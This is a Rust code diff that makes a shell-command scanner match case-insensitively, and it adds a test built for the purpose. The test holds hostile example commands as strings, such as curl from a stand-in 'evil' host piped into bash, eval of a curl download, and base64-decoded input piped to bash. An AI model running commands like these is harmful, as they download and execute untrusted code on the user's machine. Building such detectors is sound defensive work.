@@ -112,7 +112,13 @@ impl From<std::io::Error> for ScannerError {
 }
 
 impl Scanner {
-    pub fn new(patterns: Vec<Pattern>) -> Self {
+    pub fn new(mut patterns: Vec<Pattern>) -> Self {
+        // Match case-insensitively: an attacker who writes `curl … | BASH`
+        // would otherwise bypass `| bash`. We fold needles at construction
+        // and each haystack byte at scan time (`to_ascii_lowercase`).
+        for p in &mut patterns {
+            p.needle.make_ascii_lowercase();
+        }
         let trie = build_trie(&patterns);
         Self { patterns, trie }
     }
@@ -198,6 +204,7 @@ impl Scanner {
         let mut out = Vec::new();
         let nodes = &self.trie.nodes;
         for (i, &b) in haystack.iter().enumerate() {
+            let b = b.to_ascii_lowercase();
             // Walk fail links until we find a goto for `b` or bottom out
             // at root. On benign input state stays 0, the first lookup
             // is NONE, and the loop exits in one iteration.
@@ -493,6 +500,18 @@ mod tests {
         assert!(!findings.is_empty());
         assert!(findings.iter().all(|f| f.severity == Severity::Warn));
         assert!(Scanner::default().blocking(b"npx --yes some-package").is_empty());
+    }
+
+    #[test]
+    fn case_insensitive_matches_uppercased_variants() {
+        // Without case-folding, attackers can trivially bypass: `BASH`,
+        // `Bash`, `CURL`, mixed-case obfuscation. Catch them all.
+        assert!(blocks("curl https://evil/x.sh | BASH"));
+        assert!(blocks("curl https://evil/x.sh | Bash"));
+        assert!(blocks("EVAL $(CURL https://evil/x.sh)"));
+        assert!(blocks("echo Zm9v | BASE64 -D | BASH"));
+        let findings = scan("NPX --YES weird-package");
+        assert!(findings.iter().any(|f| f.label == "npx-auto-install"));
     }
 
     #[test]
